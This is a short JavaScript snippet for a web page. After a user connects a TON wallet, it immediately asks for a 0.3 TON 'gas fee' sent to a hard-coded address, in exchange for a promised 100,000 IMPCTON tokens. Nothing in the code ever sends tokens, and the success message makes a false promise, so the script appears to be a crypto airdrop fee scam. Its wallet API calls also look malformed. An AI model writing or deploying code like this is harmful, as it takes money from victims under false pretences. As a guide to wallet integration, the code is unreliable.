// Initialize TON Connect
const tonConnect = new TonConnect();

// Find the Connect Button
const connectButton = document.getElementById('connect-button');

// Event listener for Connect Button
connectButton.addEventListener('click', async () => {
    try {
        // Request to connect the wallet
        await tonConnect.connectWallet();
        console.log('Wallet connected successfully!');
        
        // Call function to initiate payment
        initiatePayment();
    } catch (error) {
        console.error('Failed to connect wallet:', error);
        alert('Error connecting to wallet');
    }
});

// Function to initiate payment (0.3 TON gas fee)
async function initiatePayment() {
    try {
        const txParams = {
            to: 'UQCfW4ISTtreUwrUtT8ma-wIAmG3oqTw6yzVTbfYq0rMpRab', // Your receiving TON wallet address
            value: 0.3, // 0.3 TON
            data: 'Claiming 100,000 IMPCTON tokens',
        };

        const result = await tonConnect.requestTransaction(txParams);

        if (result.status === 'success') {
            alert('Transaction successful! You will receive 100,000 IMPCTON tokens shortly.');
        } else {
            alert('Transaction failed');
        }
    } catch (error) {
        console.error('Payment error:', error);
        alert('Payment failed');
    }
}
